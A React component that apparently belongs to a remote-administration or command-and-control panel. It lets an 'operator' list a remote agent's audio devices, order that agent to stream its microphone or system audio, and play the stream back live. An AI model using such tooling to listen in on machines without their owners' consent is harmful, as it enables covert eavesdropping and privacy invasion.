import React, { useState, useEffect, useRef } from 'react';
import { Box, Button, Typography, IconButton, Select, MenuItem, FormControl, InputLabel } from '@mui/material';
import {
  Stop as StopIcon,
  Mic as MicIcon,
  VolumeUp as VolumeUpIcon,
  Fullscreen as FullscreenIcon
} from '@mui/icons-material';
import { io } from 'socket.io-client';
import api from '../services/api';

const SOCKET_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';

export default function AudioStreamWindow() {
  const [streaming, setStreaming] = useState(false);
  const [agentId, setAgentId] = useState(null);
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [captureSystem, setCaptureSystem] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const streamingRef = useRef(false);
  const socketRef = useRef(null);
  const audioContextRef = useRef(null);
  const sourceNodeRef = useRef(null);

  useEffect(() => {
    streamingRef.current = streaming;
  }, [streaming]);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('agentId');
    setAgentId(id);

    const token = localStorage.getItem('token');
    const socket = io(SOCKET_URL, {
      auth: { token },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('[AudioStreamWindow] Socket connected');
      socket.emit('operator_connect', { token });

      if (id) {
        api.post(`/api/agents/${id}/command`, { command: 'get_audio_devices' })
          .then(response => {
            console.log('[AudioStreamWindow] Audio devices request sent');
          })
          .catch(err => console.error('Error getting audio devices:', err));
      }
    });

    socket.on('command_result', (data) => {
      if (data.agent_id === parseInt(id)) {
        try {
          const parsed = JSON.parse(data.result);
          if (parsed.devices) {
            setDevices(parsed.devices);
          }
        } catch (e) {
          console.log('[AudioStreamWindow] Not JSON or error:', e);
        }
      }
    });

    socket.on('audio_data', (data) => {
      if (data.agent_id === parseInt(id) && streamingRef.current) {
        playAudio(data.audio, data.rate, data.channels);
      }
    });

    socketRef.current = socket;

    return () => {
      if (streamingRef.current && id) {
        stopAudioStream(id);
      }
      socket.disconnect();
    };
  }, []);

  const playAudio = (audioB64, rate, channels) => {
    try {
      if (!audioContextRef.current) {
        audioContextRef.current = new (window.AudioContext || window.webkitAudioContext)();
      }

      const audioContext = audioContextRef.current;
      const audioData = Uint8Array.from(atob(audioB64), c => c.charCodeAt(0));

      // Конвертируем PCM в Float32Array
      const float32Array = new Float32Array(audioData.length / 2);
      for (let i = 0; i < float32Array.length; i++) {
        const int16 = (audioData[i * 2 + 1] << 8) | audioData[i * 2];
        float32Array[i] = int16 / 32768.0;
      }

      const audioBuffer = audioContext.createBuffer(channels, float32Array.length / channels, rate);

      for (let channel = 0; channel < channels; channel++) {
        const channelData = audioBuffer.getChannelData(channel);
        for (let i = 0; i < channelData.length; i++) {
          channelData[i] = float32Array[i * channels + channel];
        }
      }

      const source = audioContext.createBufferSource();
      source.buffer = audioBuffer;
      source.connect(audioContext.destination);
      source.start();
    } catch (e) {
      console.error('Error playing audio:', e);
    }
  };

  const startAudioStream = (id, deviceIndex, captureSystemAudio) => {
    setStreaming(true);
    streamingRef.current = true;

    api.post(`/api/agents/${id}/command`, {
      command: 'start_audio_stream',
      params: {
        device_index: deviceIndex,
        capture_system: captureSystemAudio
      }
    }).then(() => {
      console.log('[AudioStreamWindow] Audio stream started');
    }).catch(err => {
      console.error('[AudioStreamWindow] Error starting audio stream:', err);
      setStreaming(false);
      streamingRef.current = false;
    });
  };

  const stopAudioStream = (id) => {
    setStreaming(false);
    streamingRef.current = false;

    api.post(`/api/agents/${id}/command`, {
      command: 'stop_audio_stream'
    }).then(() => {
      console.log('[AudioStreamWindow] Audio stream stopped');
    }).catch(err => {
      console.error('[AudioStreamWindow] Error stopping audio stream:', err);
    });

    if (audioContextRef.current) {
      audioContextRef.current.close();
      audioContextRef.current = null;
    }
  };

  const handleDeviceChange = (event) => {
    setSelectedDevice(event.target.value);
  };

  const handleCaptureTypeChange = (event) => {
    setCaptureSystem(event.target.value === 'system');
  };

  const handleStart = () => {
    startAudioStream(agentId, selectedDevice, captureSystem);
  };

  const toggleFullscreen = () => {
    if (!document.fullscreenElement) {
      document.documentElement.requestFullscreen();
      setIsFullscreen(true);
    } else {
      document.exitFullscreen();
      setIsFullscreen(false);
    }
  };

  return (
    <Box sx={{
      width: '100vw',
      height: '100vh',
      background: 'linear-gradient(135deg, #0a0a1e 0%, #1a1a2e 100%)',
      display: 'flex',
      flexDirection: 'column',
      overflow: 'hidden'
    }}>
      <Box sx={{
        p: 2,
        borderBottom: '1px solid rgba(49, 211, 139, 0.2)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        background: 'rgba(0, 0, 0, 0.3)'
      }}>
        <Box sx={{ display: 'flex', alignItems: 'center', gap: 2 }}>
          <VolumeUpIcon sx={{ color: 'var(--accent)' }} />
          <Typography variant="h6" sx={{ color: 'var(--text-primary)', fontWeight: 700 }}>
            Audio Stream
          </Typography>
          {streaming && (
            <Box sx={{
              px: 2,
              py: 0.5,
              borderRadius: '20px',
              background: 'rgba(76, 175, 80, 0.2)',
              border: '1px solid #4caf50',
              display: 'flex',
              alignItems: 'center',
              gap: 1
            }}>
              <Box sx={{
                width: 8,
                height: 8,
                borderRadius: '50%',
                background: '#4caf50',
                animation: 'pulse 2s ease-in-out infinite'
              }} />
              <Typography sx={{ color: '#4caf50', fontSize: '0.85rem', fontWeight: 600 }}>
                LIVE
              </Typography>
            </Box>
          )}
        </Box>

        <Box sx={{ display: 'flex', gap: 1 }}>
          <IconButton onClick={toggleFullscreen} sx={{ color: 'var(--text-secondary)' }}>
            <FullscreenIcon />
          </IconButton>
          {streaming && (
            <Button
              variant="contained"
              startIcon={<StopIcon />}
              onClick={() => stopAudioStream(agentId)}
              sx={{
                background: 'linear-gradient(135deg, #f44336 0%, #d32f2f 100%)',
                '&:hover': {
                  background: 'linear-gradient(135deg, #d32f2f 0%, #c62828 100%)'
                }
              }}
            >
              Stop Stream
            </Button>
          )}
        </Box>
      </Box>

      <Box sx={{
        flex: 1,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        p: 4,
        gap: 3
      }}>
        {!streaming ? (
          <>
            <VolumeUpIcon sx={{ fontSize: 64, color: 'var(--text-muted)', mb: 2 }} />

            <FormControl sx={{ minWidth: 300 }}>
              <InputLabel sx={{ color: 'var(--text-secondary)' }}>Capture Type</InputLabel>
              <Select
                value={captureSystem ? 'system' : 'microphone'}
                onChange={handleCaptureTypeChange}
                label="Capture Type"
                sx={{
                  color: 'var(--text-primary)',
                  '.MuiOutlinedInput-notchedOutline': {
                    borderColor: 'rgba(49, 211, 139, 0.3)'
                  }
                }}
              >
                <MenuItem value="microphone">Microphone</MenuItem>
                <MenuItem value="system">System Audio</MenuItem>
              </Select>
            </FormControl>

            {devices.length > 0 && !captureSystem && (
              <FormControl sx={{ minWidth: 300 }}>
                <InputLabel sx={{ color: 'var(--text-secondary)' }}>Audio Device</InputLabel>
                <Select
                  value={selectedDevice || ''}
                  onChange={handleDeviceChange}
                  label="Audio Device"
                  sx={{
                    color: 'var(--text-primary)',
                    '.MuiOutlinedInput-notchedOutline': {
                      borderColor: 'rgba(49, 211, 139, 0.3)'
                    }
                  }}
                >
                  {devices.map((device) => (
                    <MenuItem key={device.index} value={device.index}>
                      {device.name}
                    </MenuItem>
                  ))}
                </Select>
              </FormControl>
            )}

            <Button
              variant="contained"
              startIcon={<MicIcon />}
              onClick={handleStart}
              disabled={!captureSystem && devices.length > 0 && selectedDevice === null}
              sx={{
                mt: 2,
                background: 'linear-gradient(135deg, var(--cyan) 0%, #0066ff 100%)',
                '&:hover': {
                  background: 'linear-gradient(135deg, #0066ff 0%, #0052cc 100%)'
                }
              }}
            >
              Start Audio Stream
            </Button>
          </>
        ) : (
          <Box sx={{ textAlign: 'center' }}>
            <Typography variant="h5" sx={{ color: 'var(--text-primary)', mb: 2 }}>
              Audio streaming...
            </Typography>
            <Typography sx={{ color: 'var(--text-secondary)' }}>
              {captureSystem ? 'Capturing system audio' : 'Capturing microphone'}
            </Typography>
          </Box>
        )}
      </Box>
    </Box>
  );
}
